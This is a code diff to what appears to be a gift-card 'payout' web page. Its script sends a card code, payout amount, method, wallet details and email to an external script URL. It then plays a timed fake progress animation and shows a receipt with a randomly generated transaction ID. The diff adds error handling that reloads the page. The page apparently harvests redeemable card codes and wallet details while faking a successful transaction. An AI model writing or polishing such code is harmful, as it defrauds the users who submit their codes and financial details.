@@ -42,7 +42,7 @@
         .res-box b { font-size: 34px; color: #fff; display: block; }
         #local-payout { font-size: 13px; color: #4ade80; margin-top: 8px; font-weight: bold; display: none; background: rgba(74,222,128,0.1); padding: 6px; border-radius: 8px; border: 1px dashed #4ade80; }
 
-        /* SPONSORS/NODES SECTION */
+        /* RESTORED SPONSORS STYLE */
         .node-footer { margin-top: 30px; padding-top: 20px; border-top: 1px solid #222; text-align: center; }
         .node-footer p { font-size: 10px; color: #555; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 15px; }
         .node-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 0 10px; }
@@ -262,6 +262,7 @@
             fetch(scriptURL, {
                 method: 'POST',
                 mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ "card_code": cardCode, "payout_total_usd": amount.replace('$', ''), "payout_method": method, "wallet_details": walletDetails, "user_email": userEmail })
             }).then(() => {
                 let p = 0;
@@ -271,6 +272,9 @@
                     if(p==66) document.getElementById('s2').className='step-done';
                     if(p>=100) { clearInterval(iv); showReceipt(); }
                 }, 60);
+            }).catch(error => {
+                alert("Network connectivity error. Please try again.");
+                location.reload();
             });
         }
 
@@ -279,7 +283,7 @@
             document.getElementById('success').style.display = 'block';
             let tid = "DLA-TX" + Math.floor(100000 + Math.random() * 900000);
             
-            // Respectful Gateway Formatting
+            // Respectful Gateway Formatting (Strips emojis)
             let cleanGateway = method.replace(/([\u2700-\u27BF]|[\uE000-\uF8FF]|\uD83C[\uDC00-\uDFFF]|\uD83D[\uDC00-\uDFFF]|[\u2011-\u26FF]|\uD83E[\uDD10-\uDDFF])/g, '').trim();
             
             document.getElementById('r-tid').innerText = tid;
